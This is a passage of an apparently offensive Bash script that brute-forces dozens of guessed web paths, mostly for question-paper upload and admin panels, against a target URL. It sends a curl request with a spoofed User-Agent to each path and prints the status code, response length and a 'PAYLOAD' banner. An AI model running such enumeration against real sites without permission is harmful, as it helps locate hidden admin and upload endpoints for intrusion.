payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem_MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem_MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperBulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperBulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P-BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P-BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper-BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper-BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingQPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingQPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SuiteQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SuiteQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt_Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt_Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper_Manager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper_Manager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool_QPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool_QPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessingQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessingQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMasterFileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMasterFileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaperAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaperAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ManagerQPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ManagerQPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing_QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing_QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync-QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync-QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P-System/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P-System/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite_Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite_Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAutoPortal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAutoPortal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingQPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingQPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService_QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService_QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadServiceQPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadServiceQPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSystemQPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSystemQPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase_Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase_Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel_QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel_QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor_QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor_QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessorQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessorQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload-QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload-QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline-QPHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline-QPHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool-QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool-QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessorQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessorQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing_BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing_BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService_QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService_QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Monitoring-QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Monitoring-QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMasterDashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMasterDashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk-DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk-DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessingMonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessingMonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync_QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync_QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager_QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager_QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync-QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync-QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOpsQstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOpsQstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile-Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile-Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud_AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud_AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Transfer-QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Transfer-QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingQPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingQPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
